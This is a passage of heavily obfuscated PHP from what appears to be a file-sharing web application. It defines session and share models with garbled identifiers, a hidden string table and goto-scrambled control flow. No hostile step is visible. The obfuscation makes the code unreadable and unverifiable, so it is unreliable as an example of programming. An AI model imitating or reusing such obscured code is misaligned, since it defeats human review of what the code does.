B®íÎÔÓä›; EÖ¿Œ²Øî±: $Dô††³•á¬ =& $_SERVER[›é¼±]; $D–êîâ…² =& $this->task; $D–êîâ…²[$Dô††³•á¬[1654]] = $Dô††³•á¬[107]; goto Dõ­¡¹ãÖ; e»×¸´İ˜¡: $D–êîâ…²[$Dô††³•á¬[1069]] = 0; $D–êîâ…²[$Dô††³•á¬[1610]] = 0; $D–êîâ…²[$Dô††³•á¬[1611]] = 0; goto CÙƒ² Š‡; A¹ÓÎ×¢êç: if ($aÕ¦Éª†è[$Dô††³•á¬[29]] == $Dô††³•á¬[193]) { $D–êîâ…²[$Dô††³•á¬[1055]] = 1; } else { $D–êîâ…²[$Dô††³•á¬[1055]] = $aÕ¦Éª†è[$Dô††³•á¬[81]][$Dô††³•á¬[79]]; } $D–êîâ…²[$Dô††³•á¬[1057]] = $Dô††³•á¬[33]; $D–êîâ…²[$Dô††³•á¬[1612]] = 0; goto e»×¸´İ˜¡; Dõ­¡¹ãÖ: $aÕ¦Éª†è = IO::infoWithChildren($B—†ãĞ§ßõ); $AÚ‹éæ²ÂÆ = 0; $D–êîâ…²[$Dô††³•á¬[1619]] = array($Dô††³•á¬[1620] => $AÚ‹éæ²ÂÆ + 1, $Dô††³•á¬[415] => $aÕ¦Éª†è[$Dô††³•á¬[28]], $Dô††³•á¬[76] => $aÕ¦Éª†è[$Dô††³•á¬[76]], $Dô††³•á¬[513] => $aÕ¦Éª†è[$Dô††³•á¬[513]] ? $aÕ¦Éª†è[$Dô††³•á¬[513]] : $aÕ¦Éª†è[$Dô††³•á¬[76]]); goto A¹ÓÎ×¢êç; c•ÂÙ°: } public function nameParse($d©¸Ü øÅ) { goto dË±ÁÂ¨Ù¡; fÎ°Â“öİÌ: $this->update(); goto b±Ô¤»Î¿; dË±ÁÂ¨Ù¡: $f„ó«¹ˆ¶ =& $_SERVER[›é¼±]; $a¢İª²‘×õ =& $this->task; if ($a¢İª²‘×õ[$f„ó«¹ˆ¶[1654]] == $f„ó«¹ˆ¶[1127]) { $a¢İª²‘×õ[$f„ó«¹ˆ¶[1654]] = $f„ó«¹ˆ¶[311]; $a¢İª²‘×õ[$f„ó«¹ˆ¶[1615]] = 0; $a¢İª²‘×õ[$f„ó«¹ˆ¶[758]] = 0; } goto BÀèî‰ÈŸÏ; BÀèî‰ÈŸÏ: $aÈÜÖ‘ëõ = get_path_this($d©¸Ü øÅ); if (strstr($aÈÜÖ‘ëõ, $f„ó«¹ˆ¶[95])) { $a¢İª²‘×õ[$f„ó«¹ˆ¶[1069]] += 1; $a¢İª²‘×õ[$f„ó«¹ˆ¶[1055]] += 1; } $a¢İª²‘×õ[$f„ó«¹ˆ¶[1608]] = $d©¸Ü øÅ; goto fÎ°Â“öİÌ; b±Ô¤»Î¿: } } goto BñøÄÜØÄ; C—ÉÒ›ÀóÃ: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\x5f\x73\145\163\163\x69\157\x6e"; public function get($aÙ³Ä‰ğ) { $e™§•ˆçô =& $_SERVER[›é¼±]; $a¬† ‘åàö = $this->where(array($e™§•ˆçô[1862] => $aÙ³Ä‰ğ))->find(); if (!is_array($a¬† ‘åàö)) { return !1; } return $a¬† ‘åàö[$e™§•ˆçô[750]]; } public function set($då«»ï»ùÔ, $béæÃ¨¨, $A™©„˜è× = 3600) { $d›–™”±ˆá =& $_SERVER[›é¼±]; $fƒ¢õ»®Û½ = array($d›–™”±ˆá[1862] => $då«»ï»ùÔ, $d›–™”±ˆá[1771] => $béæÃ¨¨, $d›–™”±ˆá[1863] => $A™©„˜è× + time()); if (Session::get($d›–™”±ˆá[1864])) { $fƒ¢õ»®Û½[$d›–™”±ˆá[1564]] = Session::get($d›–™”±ˆá[1864]); } else { $fƒ¢õ»®Û½[$d›–™”±ˆá[1564]] = 0; } if ($this->get($då«»ï»ùÔ)) { return $this->where(array($d›–™”±ˆá[1862] => $då«»ï»ùÔ))->save($fƒ¢õ»®Û½); } else { return $this->add($fƒ¢õ»®Û½, array(), !0); } } public function remove($cœóÓçÔô) { return $this->where(array($_SERVER[›é¼±][1862] => $cœóÓçÔô))->delete(); } public function clearTimeout() { return $this->where($_SERVER[›é¼±][1865] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\x65"; protected $dataAuto = array(array("\155\x6f\144\x69\x66\x79\x54\x69\x6d\145", "\164\x69\155\145", "\151\156\x73\x65\x72\x74\54\165\x70\x64\x61\164\x65", "\x66\165\x6e\143\164\151\157\156"), array("\143\162\x65\x61\164\145\x54\151\155\145", "\x74\151\x6d\x65", "\151\156\163\145\162\164", "\x66\x75\x6e\x63\x74\x69\x6f\156"), array("\x6f\x70\x74\151\x6f\156\x73", '', "\151\156\163\145\x72\x74\x2c\165\160\x64\x61\x74\x65\x2c\163\x65\x6c\145\143\x74", "\x6a\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($C²•§„Ïõ) { $eÃñÏí¯îÛ =& $_SERVER[›é¼±]; $Cí½ô´Ü×­ = isset($C²•§„Ïõ[0]) ? $C²•§„Ïõ[0] : !1; return array($eÃñÏí¯îÛ[1866] => array(USER_ID, $eÃñÏí¯îÛ[1867]), $eÃñÏí¯îÛ[1809] => array($Cí½ô´Ü×­, $eÃñÏí¯îÛ[1868])); } protected function listSimple() { $f•Ášö“½Ğ = array($_SERVER[›é¼±][1564] => USER_ID); $dÕ¼½ˆ³™ = $this->field($this->fieldList)->where($f•Ášö“½Ğ)->select(); return $dÕ¼½ˆ³™ ? $dÕ¼½ˆ³™ : array(); } protected function getInfo($Cª…ÇÍÒ«¡, $fø»˜çĞéõ = false) { $C²‚Á™ï†¥ =& $_SERVER[›é¼±]; if ($fø»˜çĞéõ) { return $this->_getShareInfo(array($C²‚Á™ï†¥[482] => $Cª…ÇÍÒ«¡)); } $B©¡Çå”Ä = $this->cacheFunctionGet($C²‚Á™ï†¥[1811], $Cª…ÇÍÒ«¡); return $B©¡Çå”Ä; } public function getInfoByHash($dßÛ¾ÑÓº¼) { return $this->_getShareInfo(array($_SERVER[›é¼±][484] => $dßÛ¾ÑÓº¼)); } public function getInfoByPath($fç³±š­Íâ) { $DÚóÈøÍ× =& $_SERVER[›é¼±]; $EŠ”ƒ‰™Òì = array($DÚóÈøÍ×[1564] => USER_ID, $DÚóÈøÍ×[397] => $fç³±š­Íâ); return $this->_getShareInfo($EŠ”ƒ‰™Òì); } public function getInfoBySourcePath($A‚ïªÎà±) { $F±ŠæËÅ³ =& $_SERVER[›é¼±]; $c¥Ââğ¹‰ = array($F±ŠæËÅ³[1564] => USER_ID, $F±ŠæËÅ³[1104] => $A‚ïªÎà±); return $this->_getShareInfo($c¥Ââğ¹‰); } private function _getShareInfo($D¿ÎµÊä¿å) { goto DÛŠíâÈŠ; DÛŠíâÈŠ: $dÚ–®Ñ‚Üø =& $_SERVER[›é¼±]; $e¹åÕÌê‚ = $this->where($D¿ÎµÊä¿å)->find(); if (!$e¹åÕÌê‚) { return !1; } goto CîÓ±ã˜ƒ; bïÜŠÆ¡¾®: if ($e¹åÕÌê‚[$dÚ–®Ñ‚Üø[397]] == $dÚ–®Ñ‚Üø[191]) { $e¹åÕÌê‚[$dÚ–®Ñ‚Üø[85]] = IO::info($e¹åÕÌê‚[$dÚ–®Ñ‚Üø[1104]]); } else { $e¹åÕÌê‚[$dÚ–®Ñ‚Üø[85]] = Model($dÚ–®Ñ‚Üø[1239])->pathInfo($e¹åÕÌê‚[$dÚ–®Ñ‚Üø[397]]); } $e¹åÕÌê‚[$dÚ–®Ñ‚Üø[1870]] = $cäÏ‡ÅİÂ; return $e¹åÕÌê‚; goto Få‚íàÎŠë; CîÓ±ã˜ƒ: $D¿ÎµÊä¿å = array($dÚ–®Ñ‚Üø[482] => $e¹åÕÌê‚[$dÚ–®Ñ‚Üø[482]]); $B²ÉÃƒóÄê = $dÚ–®Ñ‚Üø[1869]; $cäÏ‡ÅİÂ = Model($dÚ–®Ñ‚Üø[590])->order($dÚ–®Ñ‚Üø[395])->field($B²ÉÃƒóÄê)->where($D¿ÎµÊä¿å)->select(); goto bïÜŠÆ¡¾®; Få‚íàÎŠë: } protected function getInfoAuth($F†Ä®Ûâ•Ş) { $d×ˆ×æ†ßÔ =& $_SERVER[›é¼±]; $B“Î§ñíåË = $this->getInfo($F†Ä®Ûâ•Ş); $B“Î§ñíåË[$d×ˆ×æ†ßÔ[408]] = Model($d×ˆ×æ†ßÔ[496])->authMake($B“Î§ñíåË[$d×ˆ×æ†ßÔ[1870]]); return $B“Î§ñíåË; } protected function listData($B×±Âá‹…‰ = null, $a±ÇŒ·…¬© = 300) { $F˜„Ç£º¸ø =& $_SERVER[›é¼±]; $bøìš­§Á = array(array($F˜„Ç£º¸ø[487] => array($F˜„Ç£º¸ø[1004], 0), $F˜„Ç£º¸ø[489] => array($F˜„Ç£º¸ø[1004], 0), $F˜„Ç£º¸ø[1871] => $F˜„Ç£º¸ø[1825])); if ($B×±Âá‹…‰ == $F˜„Ç£º¸ø[1872]) { $bøìš­§Á = array($F˜„Ç£º¸ø[487] => 1); } else { if ($B×±Âá‹…‰ == $F˜„Ç£º¸ø[1089]) { $bøìš­§Á = array($F˜„Ç£º¸ø[489] => 1); } } $bøìš­§Á[$F˜„Ç£º¸ø[1564]] = USER_ID; $Cğîšƒ… = $this->where($bøìš­§Á)->selectPage($a±ÇŒ·…¬©); return $Cğîšƒ…; } protected function listToMe($b¶Å·Í¶íá = 300) { goto dÃÅÑ’ËØ‘; F Ãî¬œá: if ($Câ×ºÛáÄ) { $bÜÊŞ‡‚“— = array(array($bÍ­Æˆ…ó[574] => SourceModel::TYPE_USER, $bÍ­Æˆ…ó[498] => USER_ID), array($bÍ­Æˆ…ó[574] => SourceModel::TYPE_GROUP, $bÍ­Æˆ…ó[498] => array($bÍ­Æˆ…ó[7], $Câ×ºÛáÄ)), $bÍ­Æˆ…ó[1871] => $bÍ­Æˆ…ó[1825]); } $a­Ë®³‰ªğ = Model($bÍ­Æˆ…ó[590])->where($bÜÊŞ‡‚“—)->selectPage($b¶Å·Í¶íá); $DÜÆ’èÓÁ· = array_to_keyvalue_group($a­Ë®³‰ªğ[$bÍ­Æˆ…ó[367]], $bÍ­Æˆ…ó[482]); goto dš‘ĞèØ‘Ğ; Cå—¿ÇƒŞ: $dë•°„®ç… = $this->field($c‚’³§»Áó)->where($bÜÊŞ‡‚“—)->select(); foreach ($dë•°„®ç… as $Bø†Õá§¶ª => &$céÍ†¯ĞŠ±) { $céÍ†¯ĞŠ±[$bÍ­Æˆ…ó[1870]] = $DÜÆ’èÓÁ·[$céÍ†¯ĞŠ±[$bÍ­Æˆ…ó[482]]]; } unset($céÍ†¯ĞŠ±); goto bÌ±‰çŸ’; bÌ±‰çŸ’: $e†¢Ë°šóË = array($bÍ­Æˆ…ó[1875] => $dë•°„®ç…, $bÍ­Æˆ…ó[1876] => $a­Ë®³‰ªğ[$bÍ­Æˆ…ó[364]]); return $e†¢Ë°šóË; goto CåÀì…©½£; dÃÅÑ’ËØ‘: $bÍ­Æˆ…ó =& $_SERVER[›é¼±]; $Câ×ºÛáÄ = Model($bÍ­Æˆ…ó[1873])->userGroupParents(USER_ID); $bÜÊŞ‡‚“— = array($bÍ­Æˆ…ó[574] => SourceModel::TYPE_USER, $bÍ­Æˆ…ó[498] => USER_ID); goto F Ãî¬œá; dš‘ĞèØ‘Ğ: if (!$DÜÆ’èÓÁ·) { return $a­Ë®³‰ªğ; } $c‚’³§»Áó = $bÍ­Æˆ…ó[1874]; $bÜÊŞ‡‚“— = array($bÍ­Æˆ…ó[482] => array($bÍ­Æˆ…ó[413], array_keys($DÜÆ’èÓÁ·)), $bÍ­Æˆ…ó[1564] => array($bÍ­Æˆ…ó[1006], $bÍ­Æˆ…ó[191])); goto Cå—¿ÇƒŞ; CåÀì…©½£: } protected function shareAdd($Aèé‰ë³, $aáØƒÈáğ) { $BÙ‘¨ Ìè· =& $_SERVER[›é¼±]; $Fß¾ô”¾¨ß = $this->_addShareData($Aèé‰ë³, $aáØƒÈáğ); if (!empty($aáØƒÈáğ[$BÙ‘¨ Ìè·[1877]])) { $this->_shareAuthSet($Fß¾ô”¾¨ß, $aáØƒÈáğ[$BÙ‘¨ Ìè·[1877]]); } $this->shareEventAdd($Aèé‰ë³, $aáØƒÈáğ, $BÙ‘¨ Ìè·[1092]); return $Fß¾ô”¾¨ß; } protected function shareAddSystem($a©§²ÊÅ«Ó, $eÌ¾ãˆÓÂ») { $a—Î–ƒ´‡µ =& $_SERVER[›é¼±]; $CŠñ†‰£„Ì = $this->_addShareData($a©§²ÊÅ«Ó, $eÌ¾ãˆÓÂ», $a—Î–ƒ´‡µ[1204]); $this->_shareAuthSet($CŠñ†‰£„Ì, $eÌ¾ãˆÓÂ»[$a—Î–ƒ´‡µ[1877]]); return $CŠñ†‰£„Ì; } private function shareEventAdd($Cô°‰ÆÕÄÒ, $Dî¯±µÁ, $d‚ ¢—«İŠ = "\141\144\144") { goto c î°¦’Ş; Fğñì¥ëİí: if ($c¢Œí˜”¢[$e½ù§—ó½Ó[487]] == $e½ù§—ó½Ó[87] && $Dî¯±µÁ[$e½ù§—ó½Ó[487]] == $e½ù§—ó½Ó[191]) { $c§‰ÆÅ—£ù = $e½ù§—ó½Ó[1881]; } if ($c¢Œí˜”¢[$e½ù§—ó½Ó[489]] == $e½ù§—ó½Ó[191] && $Dî¯±µÁ[$e½ù§—ó½Ó[489]] == $e½ù§—ó½Ó[87]) { $c§‰ÆÅ—£ù = $e½ù§—ó½Ó[1879]; } if ($c¢Œí˜”¢[$e½ù§—ó½Ó[489]] == $e½ù§—ó½Ó[87] && $Dî¯±µÁ[$e½ù§—ó½Ó[489]] == $e½ù§—ó½Ó[191]) { $c§‰ÆÅ—£ù = $e½ù§—ó½Ó[1882]; } goto c‰³©‘Í¿; c‰³©‘Í¿: Model($e½ù§—ó½Ó[558])->eventShare($Cô°‰ÆÕÄÒ, $c§‰ÆÅ—£ù); return; goto Føä ¾Íå; D³ÄëÆ£¾: $c¢Œí˜”¢ = $this->getInfoByPath($Cô°‰ÆÕÄÒ); $c§‰ÆÅ—£ù = $e½ù§—ó½Ó[1880]; if ($c¢Œí˜”¢[$e½ù§—ó½Ó[487]] == $e½ù§—ó½Ó[191] && $Dî¯±µÁ[$e½ù§—ó½Ó[487]] == $e½ù§—ó½Ó[87]) { $c§‰ÆÅ—£ù = $e½ù§—ó½Ó[1878]; } goto Fğñì¥ëİí; c î°¦’Ş: $e½ù§—ó½Ó =& $_SERVER[›é¼±]; if (!$Cô°‰ÆÕÄÒ || $Cô°‰ÆÕÄÒ == $e½ù§—ó½Ó[191]) { return; } if ($d‚ ¢—«İŠ == $e½ù§—ó½Ó[1092]) { if ($Dî¯±µÁ[$e½ù§—ó½Ó[487]] == $e½ù§—ó½Ó[87]) { Model($e½ù§—ó½Ó[558])->eventShare($Cô°‰ÆÕÄÒ, $e½ù§—ó½Ó[1878]); } if ($Dî¯±µÁ[$e½ù§—ó½Ó[489]] == $e½ù§—ó½Ó[87]) { Model($e½ù§—ó½Ó[558])->eventShare($Cô°‰ÆÕÄÒ, $e½ù§—ó½Ó[1879]); } return; } goto D³ÄëÆ£¾; Føä ¾Íå: } private function _addShareData($B×‘çïµê, $F”â·ÎŸ‘´ = array(), $aĞø¥ªÕĞ‰ = false) { goto D×âÈ¡›†¶; b¼ØŞâ¾ò°: foreach ($EòçªÛ™Ôæ as $Fğ‡èÒ¹‘) { if (!isset($F”â·ÎŸ‘´[$Fğ‡èÒ¹‘])) { continue; } $EÙÇµ¡ã†à[$Fğ‡èÒ¹‘] = $F”â·ÎŸ‘´[$Fğ‡èÒ¹‘]; } $dµ©÷™‚…ì = $this->add($EÙÇµ¡ã†à); $BÓ¦ÏÕ‚£± = array($EŒÜÓéİ‚ó[484] => short_id($dµ©÷™‚…ì)); goto DîÕ»½–±; DîÕ»½–±: $this->where(array($EŒÜÓéİ‚ó[481] => $dµ©÷™‚…ì))->save($BÓ¦ÏÕ‚£±); return $dµ©÷™‚…ì; goto FªìÜ¿¯ÙÇ; e§»»Êõ¼‡: if (!$F”â·ÎŸ‘´[$EŒÜÓéİ‚ó[1464]]) { $F”â·ÎŸ‘´[$EŒÜÓéİ‚ó[1464]] = $Cõ¹¬µö’[$EŒÜÓéİ‚ó[28]]; } $EÙÇµ¡ã†à = array($EŒÜÓéİ‚ó[1555] => $CñÓÏéÀ±Ñ, $EŒÜÓéİ‚ó[412] => $B×‘çïµê, $EŒÜÓéİ‚ó[1464] => $EŒÜÓéİ‚ó[33], $EŒÜÓéİ‚ó[487] => 0, $EŒÜÓéİ‚ó[489] => 0, $EŒÜÓéİ‚ó[1104] => $EŒÜÓéİ‚ó[33], $EŒÜÓéİ‚ó[305] => $EŒÜÓéİ‚ó[33], $EŒÜÓéİ‚ó[884] => $EŒÜÓéİ‚ó[33], $EŒÜÓéİ‚ó[1884] => 0, $EŒÜÓéİ‚ó[1885] => 0, $EŒÜÓéİ‚ó[490] => 0, $EŒÜÓéİ‚ó[491] => $EŒÜÓéİ‚ó[33], $EŒÜÓéİ‚ó[484] => $EŒÜÓéİ‚ó[33]); $EòçªÛ™Ôæ = explode($EŒÜÓéİ‚ó[47], $EŒÜÓéİ‚ó[1886]); goto b¼ØŞâ¾ò°; D×âÈ¡›†¶: $EŒÜÓéİ‚ó =& $_SERVER[›é¼±]; $CñÓÏéÀ±Ñ = $aĞø¥ªÕĞ‰ == $EŒÜÓéİ‚ó[1204] ? 0 : USER_ID; $b‚ÎÔîÁ = array($EŒÜÓéİ‚ó[412] => $B×‘çïµê, $EŒÜÓéİ‚ó[1555] => $CñÓÏéÀ±Ñ); goto A‰İÃÑ¥ğ; A‰İÃÑ¥ğ: if ($B×‘çïµê == 0) { $b‚ÎÔîÁ = array($EŒÜÓéİ‚ó[1883] => $F”â·ÎŸ‘´[$EŒÜÓéİ‚ó[1104]], $EŒÜÓéİ‚ó[1555] => $CñÓÏéÀ±Ñ); } if ($AÜ–¯¾»‹‹ = $this->where($b‚ÎÔîÁ)->find()) { return $AÜ–¯¾»‹‹[$EŒÜÓéİ‚ó[482]]; } if ($B×‘çïµê == 0) { $Cõ¹¬µö’ = array($EŒÜÓéİ‚ó[28] => get_path_this($F”â·ÎŸ‘´[$EŒÜÓéİ‚ó[76]])); } else { $Cõ¹¬µö’ = Model($EŒÜÓéİ‚ó[827])->sourceInfo($B×‘çïµê); if (!$Cõ¹¬µö’) { return !1; } } goto e§»»Êõ¼‡; FªìÜ¿¯ÙÇ: } private function _shareAuthSet($DŠ£–İ²ƒ, $b´Üˆƒ…Ì‚) { goto f´µœğÁ; f´µœğÁ: $Dğã‡ê§É =& $_SERVER[›é¼±]; if (!is_array($b´Üˆƒ…Ì‚)) { return !1; } $e»»‰ÊÁâ = Model($Dğã‡ê§É[1837]); goto Bòè…‹Ô¨ì; Bòè…‹Ô¨ì: $e»»‰ÊÁâ->where(array($Dğã‡ê§É[482] => $DŠ£–İ²ƒ))->delete(); $bø×ì—°àé = array(); foreach ($b´Üˆƒ…Ì‚ as $d£¢–Šë–) { $f”ÊêôŞ¹è = SourceModel::TYPE_USER; if ($d£¢–Šë–[$Dğã‡ê§É[406]] == SourceModel::TYPE_GROUP) { $f”ÊêôŞ¹è = SourceModel::TYPE_GROUP; } $c‹áÚºÉ¼ = array($Dğã‡ê§É[482] => $DŠ£–İ²ƒ, $Dğã‡ê§É[406] => $f”ÊêôŞ¹è, $Dğã‡ê§É[498] => intval($d£¢–Šë–[$Dğã‡ê§É[498]]), $Dğã‡ê§É[1833] => 0, $Dğã‡ê§É[1887] => -1); if ($d£¢–Šë–[$Dğã‡ê§É[1833]]) { $c‹áÚºÉ¼[$Dğã‡ê§É[1833]] = $d£¢–Šë–[$Dğã‡ê§É[1833]]; } else { if ($d£¢–Šë–[$Dğã‡ê§É[1887]]) { $c‹áÚºÉ¼[$Dğã‡ê§É[1887]] = $d£¢–Šë–[$Dğã‡ê§É[1887]]; } } $bø×ì—°àé[] = $c‹áÚºÉ¼; } goto A±‹¸»ë­; A±‹¸»ë­: return $e»»‰ÊÁâ->addAll($bø×ì—°àé, array(), !0); goto a·ã­ˆˆí; a·ã­ˆˆí: } public function numViewAdd($B’¦–¶îÊ) { $D˜ÁŠš’Ïª =& $_SERVER[›é¼±]; $BéËõ­ùˆ« = array($D˜ÁŠš’Ïª[481] => $B’¦–¶îÊ); $this->where($BéËõ­ùˆ«)->setAdd($D˜ÁŠš’Ïª[1884]); } public function numDownloadAdd($dŸ¢ÄÜ¹ãí) { $D¬‘¨Œî‘¾ =& $_SERVER[›é¼±]; $DÖ©´¥¸æ¿ = array($D¬‘¨Œî‘¾[481] => $dŸ¢ÄÜ¹ãí); $this->where($DÖ©´¥¸æ¿)->setAdd($D¬‘¨Œî‘¾[1885]); } protected function shareEdit($bŠôŞŒÁ, $eÉ–åÚáÏ‰) { goto B±¶òí†‰; cÌ†ÑÑ³©ˆ: $this->_checkLinkShare($eÉ–åÚáÏ‰, $FÓƒ¡²Ê­); $eÔíÌŒõÂ = array(); $f´¹Â¸ØãÖ = explode($DÔ‹–´¦Š‹[47], $DÔ‹–´¦Š‹[1888]); goto CÍÙöŸˆ‹; EèŞ®–œéÊ: if (isset($eÉ–åÚáÏ‰[$DÔ‹–´¦Š‹[1877]])) { $this->_shareAuthSet($bŠôŞŒÁ, $eÉ–åÚáÏ‰[$DÔ‹–´¦Š‹[1877]]); } return !0; goto bÆŠğÁ¯šñ; CÍÙöŸˆ‹: foreach ($f´¹Â¸ØãÖ as $BÀÃùš…ÚÑ) { if (!array_key_exists($BÀÃùš…ÚÑ, $eÉ–åÚáÏ‰)) { continue; } $eÔíÌŒõÂ[$BÀÃùš…ÚÑ] = $eÉ–åÚáÏ‰[$BÀÃùš…ÚÑ]; } $this->shareEventAdd($FÓƒ¡²Ê­[$DÔ‹–´¦Š‹[397]], $eÉ–åÚáÏ‰, $DÔ‹–´¦Š‹[1700]); $this->where(array($DÔ‹–´¦Š‹[481] => $bŠôŞŒÁ))->save($eÔíÌŒõÂ); goto EèŞ®–œéÊ; B±¶òí†‰: $DÔ‹–´¦Š‹ =& $_SERVER[›é¼±]; $FÓƒ¡²Ê­ = $this->getInfo($bŠôŞŒÁ); if (!$FÓƒ¡²Ê­) { return !1; } goto cÌ†ÑÑ³©ˆ; bÆŠğÁ¯šñ: } private function _checkLinkShare($b„ÔŒˆà , $a†Ë±ã™·´) { goto eª¶–†Õ±; fë¦øî ˆ: $Fóâ¬¶êÃâ = $this->shareFileMeta($fƒ”µ×–½[$AÃğå½ó‚ù[461]]); if (isset($Fóâ¬¶êÃâ[$AÃğå½ó‚ù[372]]) && $Fóâ¬¶êÃâ[$AÃğå½ó‚ù[372]] == $AÃğå½ó‚ù[87]) { show_json(LNG($AÃğå½ó‚ù[1891]), !1); } goto eÓ•ÍŞ‡£”; eª¶–†Õ±: $AÃğå½ó‚ù =& $_SERVER[›é¼±]; if ($b„ÔŒˆà [$AÃğå½ó‚ù[487]] != $AÃğå½ó‚ù[87]) { return; } $E¯ÂÚØ†æŠ = $a†Ë±ã™·´[$AÃğå½ó‚ù[85]][$AÃğå½ó‚ù[397]]; goto F˜„­¦ˆß; F˜„­¦ˆß: if ($a†Ë±ã™·´[$AÃğå½ó‚ù[85]][$AÃğå½ó‚ù[29]] != $AÃğå½ó‚ù[193]) { $aê²†Ù¬Î‰ = $this->_folderReport($E¯ÂÚØ†æŠ); if (!$aê²†Ù¬Î‰) { return; } show_json(LNG($AÃğå½ó‚ù[1889]) . $AÃğå½ó‚ù[1890] . $aê²†Ù¬Î‰, !1); } $fƒ”µ×–½ = Model($AÃğå½ó‚ù[827])->fileInfoGet($a†Ë±ã™·´[$AÃğå½ó‚ù[85]][$AÃğå½ó‚ù[397]]); if (!$fƒ”µ×–½) { return; } goto fë¦øî ˆ; eÓ•ÍŞ‡£”: } private function _folderReport($b—Èç™’ôŠ) { goto F’´Á¸—œˆ; F’´Á¸—œˆ: $E¨õ–Şº÷¶ =& $_SERVER[›é¼±]; $dÖ²ããÓ¯õ = array($E¨õ–Şº÷¶[461] => array($E¨õ–Şº÷¶[1004], 0), $E¨õ–Şº÷¶[745] => 3); $e³“ïÜ¼ = Model($E¨õ–Şº÷¶[1892])->where($dÖ²ããÓ¯õ)->field($E¨õ–Şº÷¶[461])->select(); goto A–åŠ–îø«; A–åŠ–îø«: if (!$e³“ïÜ¼) { return !1; } $e³“ïÜ¼ = array_to_keyvalue($e³“ïÜ¼, $E¨õ–Şº÷¶[33], $E¨õ–Şº÷¶[461]); $AÏ£Ô®ã”º = $E¨õ–Şº÷¶[47] . $b—Èç™’ôŠ . $E¨õ–Şº÷¶[47]; goto cô‹··Ö·Ø; EàÃğºâÀ: $F±Ä“éİäÆ = substr($A¢òËå£ºä[$E¨õ–Şº÷¶[515]], strpos($A¢òËå£ºä[$E¨õ–Şº÷¶[515]], $AÏ£Ô®ã”º)); $dÖ²ããÓ¯õ = array($E¨õ–Şº÷¶[397] => array($E¨õ–Şº÷¶[7], trim($F±Ä“éİäÆ, $E¨õ–Şº÷¶[47]))); $FÓï˜º…°Õ = Model($E¨õ–Şº÷¶[827])->where($dÖ²ããÓ¯õ)->field($E¨õ–Şº÷¶[28])->select(); goto aùè¯›”ÑŠ; cô‹··Ö·Ø: $dÖ²ããÓ¯õ = array($E¨õ–Şº÷¶[461] => array($E¨õ–Şº÷¶[7], $e³“ïÜ¼), $E¨õ–Şº÷¶[515] => array($E¨õ–Şº÷¶[381], "\x25{$AÏ£Ô®ã”º}\45"), $E¨õ–Şº÷¶[425] => 0); $A¢òËå£ºä = Model($E¨õ–Şº÷¶[827])->where($dÖ²ããÓ¯õ)->field($E¨õ–Şº÷¶[1893])->find(); if (!$A¢òËå£ºä) { return !1; } goto EàÃğºâÀ; aùè¯›”ÑŠ: $eî‘Åá…‘¸ = array_to_keyvalue($FÓï˜º…°Õ, $E¨õ–Şº÷¶[33], $E¨õ–Şº÷¶[28]); $eî‘Åá…‘¸[] = $A¢òËå£ºä[$E¨õ–Şº÷¶[28]]; return implode($E¨õ–Şº÷¶[8], $eî‘Åá…‘¸); goto BŒŒ®âÈæ; BŒŒ®âÈæ: } protected function remove($d‚î×Øó®ó) { goto a¼øŞĞªÆê; eßã¶¦ÓÙÜ: for ($bøå®š¡Ö = 0; $bøå®š¡Ö < count($C·°óîˆ‡§); $bøå®š¡Ö++) { $Dñç‚ô¦»¢ = $this->getInfo($C·°óîˆ‡§[$bøå®š¡Ö]); if ($Dñç‚ô¦»¢[$EÖÕç„Ê¶â[489]] == $EÖÕç„Ê¶â[87]) { Model($EÖÕç„Ê¶â[558])->eventShare($Dñç‚ô¦»¢[$EÖÕç„Ê¶â[397]], $EÖÕç„Ê¶â[1882]); } if ($Dñç‚ô¦»¢[$EÖÕç„Ê¶â[487]] == $EÖÕç„Ê¶â[87]) { Model($EÖÕç„Ê¶â[558])->eventShare($Dñç‚ô¦»¢[$EÖÕç„Ê¶â[397]], $EÖÕç„Ê¶â[1881]); } } return $dÇøåëÛ¡; goto f°ŸÑæã; a¼øŞĞªÆê: $EÖÕç„Ê¶â =& $_SERVER[›é¼±]; if (is_array($d‚î×Øó®ó)) { $d‚î×Øó®ó = array($EÖÕç„Ê¶â[7], $d‚î×Øó®ó); } $FÊÔÔìšÊ§ = array($EÖÕç„Ê¶â[482] => $d‚î×Øó®ó); goto a¨ù‡–ãÚ; a¨ù‡–ãÚ: $dÇøåëÛ¡ = $this->where($FÊÔÔìšÊ§)->delete(); if ($dÇøåëÛ¡) { Model($EÖÕç„Ê¶â[590])->where(array($EÖÕç„Ê¶â[482] => $d‚î×Øó®ó))->delete(); } $C·°óîˆ‡§ = is_array($d‚î×Øó®ó) ? $d‚î×Øó®ó[1] : array($d‚î×Øó®ó); goto eßã¶¦ÓÙÜ; f°ŸÑæã: } protected function removeBySource($EöòÏ Õ¯) { goto Cí„¯Ğäì¨; bÑ–„Ò¾¹¤: $e£­ñÆ‹äğ = array_to_keyvalue($e£­ñÆ‹äğ, $eòë½ö‰Í[33], $eòë½ö‰Í[482]); if (!$e£­ñÆ‹äğ) { return; } $c÷ÆŒÀÈ‹õ = array($eòë½ö‰Í[481] => array($eòë½ö‰Í[413], $e£­ñÆ‹äğ)); goto Féò™œÓ¿; Cí„¯Ğäì¨: $eòë½ö‰Í =& $_SERVER[›é¼±]; $c÷ÆŒÀÈ‹õ = array($eòë½ö‰Í[412] => array($eòë½ö‰Í[413], $EöòÏ Õ¯)); $e£­ñÆ‹äğ = $this->field($eòë½ö‰Í[482])->where($c÷ÆŒÀÈ‹õ)->select(); goto bÑ–„Ò¾¹¤; Féò™œÓ¿: $this->where($c÷ÆŒÀÈ‹õ)->delete(); Model($eòë½ö‰Í[590])->where($c÷ÆŒÀÈ‹õ)->delete(); goto CÓÚà©»Ğ½; CÓÚà©»Ğ½: } public function listAll($DÖØôœ é) { goto E’†‰¾‹Ì‚; E’†‰¾‹Ì‚: $DÈÇ×½ĞÚ¯ =& $_SERVER[›é¼±]; $bòã´“Ê´ = array(); if ($DÖØôœ é[$DÈÇ×½ĞÚ¯[1564]]) { $bòã´“Ê´[$DÈÇ×½ĞÚ¯[1564]] = $DÖØôœ é[$DÈÇ×½ĞÚ¯[1564]]; } goto e‹ÜÚ‰ôåß; Dåå‹æëŒ: $A‹…ÀÑ»ƒì = $this->_makeOrder()->where($bòã´“Ê´)->selectPage(20); if (empty($A‹…ÀÑ»ƒì[$DÈÇ×½ĞÚ¯[367]])) { return array(); } 